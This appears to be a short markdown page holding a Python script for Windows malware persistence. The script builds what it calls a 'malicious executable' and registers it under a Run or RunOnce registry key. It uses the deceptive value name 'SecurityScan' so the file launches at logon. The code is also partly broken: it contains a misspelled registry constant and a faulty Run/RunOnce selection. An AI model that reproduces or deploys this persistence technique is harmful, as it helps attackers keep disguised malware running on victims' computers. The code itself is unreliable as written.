# Registry autorun

### By Auto run kry for windows

```python
import os, shutil , winreg

filedir = os.path.join(os.getcwd(),"Temp")
filename = "begin.exe"
filepath = os.path.join(filedir,filename)

if os.path.isfile(filepath):
    os.remove(filepath)

# use buildExe to create malicious executable
os.system("python BuildEx.py")

# Move malicious executable to desired directory 
shutil.move(filename,filedir)

# Windows default autorun keys:
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run               regkey => 0  
# HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce           regkey => 1
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run              regkey => 2
# HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce          regkey => 3

regkey = 1

if regkey < 2:
    reghive = winreg.HKEY_CURRENT_USER
else:
    reghive = winreg.HKRY_LOCAL_MACHINE
if (reghive % 2) == 0:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
else:
    regpath = "SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"

# Add registry autorun key 
reg = winreg.ConnectRegistry(None,reghive)
key = winreg.OpenKey(reg,regpath,0,access= winreg.KEY_WRITE)
winreg.SetValueEx(key,"SecurityScan",0,winreg.REG_SZ,filepath)
```